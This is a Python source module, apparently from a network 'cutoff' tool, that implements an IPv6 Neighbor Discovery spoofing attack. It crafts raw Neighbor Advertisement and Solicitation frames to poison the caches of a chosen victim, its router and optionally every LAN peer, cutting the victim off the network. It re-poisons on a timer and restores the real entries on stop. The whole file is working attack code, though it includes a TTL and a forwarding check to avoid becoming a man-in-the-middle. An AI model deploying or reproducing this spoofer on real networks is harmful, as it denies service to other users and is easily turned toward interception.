"""IPv6 neighbour-discovery black hole — the v6 counterpart of :mod:`arpguard`.

An IPv6 host resolves its **default router** through NDP, not through an
address configuration, so poisoning the router's link-local entry cuts every
off-link packet regardless of which source address the victim is using. That
is the one thing ip6tables on an ordinary workstation cannot do: it never sees
traffic the router forwards on the victim's behalf.

Frames sent (RFC 4861):
  * unsolicited Neighbor Advertisement, Override=1 -> "address X is at my MAC"
  * Neighbor Solicitation as a cache primer -> makes the target create an
    entry for a spoofed source that was not in its cache yet (Linux ignores an
    unsolicited NA for a target it has never resolved, so priming is required
    before the first poison for a brand-new peer).

Nothing is forwarded. The caller must prove forwarding is off or that a
MAC-level FORWARD drop is installed, exactly as with ARP.
"""
from __future__ import annotations

import ipaddress
import logging
import socket
import struct
import threading
import time

log = logging.getLogger("cutoff.ndpguard")

ETH_P_IPV6 = 0x86DD
IPPROTO_ICMPV6 = 58
ICMPV6_NS = 135
ICMPV6_NA = 136
HOP_LIMIT = 255
OPT_SLL = 1
OPT_TLL = 2
FLAG_OVERRIDE = 0x20000000  # 4-byte NA flag word: R=0, S=0, O=1
MAX_PAIRS = 64


def _mac_bytes(mac: str) -> bytes:
    return bytes.fromhex(mac.replace(":", "").replace("-", ""))


def _addr_bytes(addr: str) -> bytes:
    return socket.inet_pton(socket.AF_INET6, (addr or "").split("%", 1)[0])


def icmpv6_checksum(src_ip: str, dst_ip: str, payload: bytes) -> int:
    """One's-complement checksum over the IPv6 pseudo-header + ICMPv6 body."""
    pseudo = _addr_bytes(src_ip) + _addr_bytes(dst_ip)
    pseudo += struct.pack("!I", len(payload)) + b"\x00\x00\x00" + bytes([IPPROTO_ICMPV6])
    data = pseudo + payload
    if len(data) % 2:
        data += b"\x00"
    total = sum(struct.unpack(f"!{len(data) // 2}H", data))
    while total >> 16:
        total = (total & 0xFFFF) + (total >> 16)
    return ~total & 0xFFFF


def _ethernet(dst_mac: str, src_mac: str, ethertype: int = ETH_P_IPV6) -> bytes:
    return struct.pack("!6s6sH", _mac_bytes(dst_mac), _mac_bytes(src_mac), ethertype)


def _ipv6_header(src_ip: str, dst_ip: str, payload_len: int) -> bytes:
    return struct.pack(
        "!IHBB16s16s",
        6 << 28,            # version 6, traffic class 0, flow label 0
        payload_len,
        IPPROTO_ICMPV6,
        HOP_LIMIT,          # NDP must be sent with hop limit 255
        _addr_bytes(src_ip),
        _addr_bytes(dst_ip),
    )


def _icmp_message(kind: int, flags: int, fields: bytes,
                  src_ip: str, dst_ip: str) -> bytes:
    """ICMPv6 message: 4-byte type/code/checksum + 4-byte flags + fields."""
    head = struct.pack("!BBHI", kind, 0, 0, flags)
    checksum = icmpv6_checksum(src_ip, dst_ip, head + fields)
    return head[:2] + struct.pack("!H", checksum) + head[4:] + fields


def na_frame(dst_mac: str, src_mac: str, src_ip: str, dst_ip: str,
             target_ip: str, tll_mac: str) -> bytes:
    """Unsolicited Neighbor Advertisement: ``target_ip`` lives at ``tll_mac``."""
    fields = _addr_bytes(target_ip)
    fields += struct.pack("!BB", OPT_TLL, 1) + _mac_bytes(tll_mac)
    icmp = _icmp_message(ICMPV6_NA, FLAG_OVERRIDE, fields, src_ip, dst_ip)
    return _ethernet(dst_mac, src_mac) + _ipv6_header(src_ip, dst_ip, len(icmp)) + icmp


def ns_frame(dst_mac: str, src_mac: str, src_ip: str, dst_ip: str,
             target_ip: str, sll_mac: str) -> bytes:
    """Neighbor Solicitation used as a cache primer for ``src_ip``."""
    fields = _addr_bytes(target_ip) + struct.pack("!BB", OPT_SLL, 1) + _mac_bytes(sll_mac)
    icmp = _icmp_message(ICMPV6_NS, 0, fields, src_ip, dst_ip)
    return _ethernet(dst_mac, src_mac) + _ipv6_header(src_ip, dst_ip, len(icmp)) + icmp


def forwarding() -> bool:
    try:
        with open("/proc/sys/net/ipv6/conf/all/forwarding", encoding="utf-8") as fh:
            return fh.read().strip() == "1"
    except OSError:
        return False


class NdpBlackhole:
    """Bidirectional NDP black hole for one victim.

    Always poisons the victim's entry for the default router and the router's
    entry for each of the victim's addresses. With ``total=True`` it also
    poisons every known LAN peer, in both directions, and re-reads that peer
    list from ``peer_provider`` every ``peer_refresh`` seconds so devices that
    appear after the block are picked up.
    """

    def __init__(self, iface: str, our_mac: str, our_ip6: str,
                 victim_mac: str, victim_addrs: list[str],
                 router_ip: str, router_mac: str,
                 peers: list[dict] | None = None, total: bool = False,
                 refresh: float = 2.0, max_minutes: int = 120,
                 forward_blocked: bool = False,
                 peer_provider=None, peer_refresh: float = 10.0):
        self.iface = iface
        self.our_mac = our_mac
        self.our_ip6 = our_ip6
        self.victim_mac = victim_mac
        self.victim_addrs = [str(ipaddress.ip_address(a.split("%", 1)[0]))
                             for a in victim_addrs if _valid6(a)][:8]
        self.router_ip = str(ipaddress.ip_address(router_ip.split("%", 1)[0]))
        self.router_mac = router_mac
        self.peers = self._clean_peers(peers or [])
        self.total = total
        self.refresh = max(0.5, refresh)
        self.max_seconds = max(1, max_minutes) * 60
        self.forward_blocked = forward_blocked
        self.peer_provider = peer_provider
        self.peer_refresh = max(1.0, peer_refresh)
        self.victim_ll = next((a for a in self.victim_addrs
                               if ipaddress.ip_address(a).is_link_local),
                              self.victim_addrs[0])
        self.pairs = self._build_pairs()
        self.started_at = 0.0
        self.sent = 0
        self.primed = 0
        self._primed_keys: set[tuple[str, str]] = set()
        self._lock = threading.Lock()
        self._stop = threading.Event()
        self._sock: socket.socket | None = None
        self._thread: threading.Thread | None = None
        self.error = ""

    @staticmethod
    def _clean_peers(peers: list[dict]) -> list[dict]:
        out: list[dict] = []
        for peer in peers:
            mac = (peer.get("mac") or "").lower()
            dst = peer.get("dst") or ""
            addrs = [a for a in (peer.get("addrs") or []) if _valid6(a)]
            if not mac or not dst or not addrs:
                continue
            out.append({"mac": mac, "dst": dst, "addrs": addrs[:8]})
        return out[:MAX_PAIRS]

    def _build_pairs(self) -> list[dict]:
        pairs: list[dict] = [
            {"dst_mac": self.victim_mac, "dst_ip": self.victim_ll,
             "spoof_ip": self.router_ip, "real_mac": self.router_mac},
        ]
        for addr in self.victim_addrs:
            pairs.append({"dst_mac": self.router_mac, "dst_ip": self.router_ip,
                          "spoof_ip": addr, "real_mac": self.victim_mac})
        if self.total:
            for peer in self.peers:
                if peer["mac"] in (self.victim_mac, self.our_mac):
                    continue
                for addr in peer["addrs"]:
                    pairs.append({"dst_mac": self.victim_mac, "dst_ip": self.victim_ll,
                                  "spoof_ip": addr, "real_mac": peer["mac"]})
                for addr in self.victim_addrs:
                    pairs.append({"dst_mac": peer["mac"], "dst_ip": peer["dst"],
                                  "spoof_ip": addr, "real_mac": self.victim_mac})
        unique: dict[tuple[str, str], dict] = {}
        for pair in pairs:
            unique[(pair["dst_mac"], pair["spoof_ip"])] = pair
        return list(unique.values())[:MAX_PAIRS * 2]

    # -- lifecycle ---------------------------------------------------------
    def start(self) -> tuple[bool, str]:
        for name, value in (("our address", self.our_ip6),
                            ("router address", self.router_ip)):
            if not _valid6(value):
                return False, f"invalid {name}: {value}"
        if not self.victim_addrs:
            return False, "no IPv6 address known for the victim"
        if self.victim_mac == self.our_mac:
            return False, "refusing to intercept this host's own MAC"
        if not self.router_mac or not self.victim_mac:
            return False, "router or victim MAC is unknown"
        if forwarding() and not self.forward_blocked:
            return False, ("IPv6 forwarding is enabled and no FORWARD drop was "
                           "installed; NDP spoofing would become a MITM")
        try:
            self._sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                                       socket.htons(ETH_P_IPV6))
            self._sock.bind((self.iface, ETH_P_IPV6))
        except (PermissionError, OSError, AttributeError) as exc:
            self.error = f"raw IPv6 socket unavailable: {exc}"
            return False, self.error
        self.started_at = time.time()
        self._send_all(poison=True)
        self._thread = threading.Thread(target=self._loop, daemon=True,
                                        name=f"ndp-blackhole-{self.victim_ll}")
        self._thread.start()
        return True, (f"NDP black-holing {len(self.victim_addrs)} address(es) "
                      f"({len(self.pairs)} NA pairs, total={self.total})")

    def _prime(self, pair: dict) -> None:
        """Create the cache entry the target will need to accept our NA."""
        key = (pair["dst_mac"], pair["spoof_ip"])
        if key in self._primed_keys or not self._sock:
            return
        frame = ns_frame(dst_mac=pair["dst_mac"], src_mac=self.our_mac,
                         src_ip=pair["spoof_ip"], dst_ip=pair["dst_ip"],
                         target_ip=pair["dst_ip"], sll_mac=self.our_mac)
        try:
            self._sock.send(frame)
            self.primed += 1
            self._primed_keys.add(key)
        except OSError as exc:
            self.error = str(exc)

    def _send_pair(self, pair: dict, poison: bool) -> None:
        if not self._sock:
            return
        tll = self.our_mac if poison else pair["real_mac"]
        frame = na_frame(dst_mac=pair["dst_mac"], src_mac=self.our_mac,
                         src_ip=self.our_ip6, dst_ip=pair["dst_ip"],
                         target_ip=pair["spoof_ip"], tll_mac=tll)
        try:
            self._sock.send(frame)
            self.sent += 1
        except OSError as exc:
            self.error = str(exc)

    def _send_all(self, poison: bool = True) -> None:
        with self._lock:
            pairs = list(self.pairs)
        for pair in pairs:
            if poison:
                self._prime(pair)
            self._send_pair(pair, poison)

    def _refresh_peers(self) -> None:
        if not self.peer_provider:
            return
        try:
            peers = self.peer_provider()
        except Exception:  # noqa: BLE001 - a bad probe must not kill the block
            log.exception("NDP peer provider failed")
            return
        cleaned = self._clean_peers(peers or [])
        if cleaned == self.peers:
            return
        with self._lock:
            self.peers = cleaned
            self.pairs = self._build_pairs()
        log.info("NDP peer list refreshed: %d peer(s), %d pairs",
                 len(self.peers), len(self.pairs))

    def _restore(self) -> None:
        for _ in range(3):
            self._send_all(poison=False)
            time.sleep(0.15)

    def _loop(self) -> None:
        last_peer = time.time()
        while not self._stop.wait(self.refresh):
            if time.time() - self.started_at > self.max_seconds:
                log.warning("NDP black-hole TTL expired for %s", self.victim_ll)
                self._restore()
                self._stop.set()
                break
            if time.time() - last_peer >= self.peer_refresh:
                last_peer = time.time()
                self._refresh_peers()
            self._send_all(poison=True)

    def stop(self) -> None:
        self._stop.set()
        if self._thread:
            self._thread.join(timeout=3)
        self._restore()
        if self._sock:
            try:
                self._sock.close()
            except OSError:
                pass
        self._sock = None

    def status(self) -> dict:
        return {
            "target_mac": self.victim_mac,
            "target_ips": self.victim_addrs,
            "router": self.router_ip,
            "total": self.total,
            "pairs": len(self.pairs),
            "peers": len(self.peers) if self.total else 0,
            "active": bool(self._thread and self._thread.is_alive()),
            "sent": self.sent,
            "primed": self.primed,
            "age_s": int(time.time() - self.started_at) if self.started_at else 0,
            "ttl_s": self.max_seconds,
            "error": self.error,
        }


def _valid6(value: str) -> bool:
    try:
        ip = ipaddress.ip_address((value or "").split("%", 1)[0])
    except ValueError:
        return False
    return ip.version == 6 and not (ip.is_multicast or ip.is_unspecified)
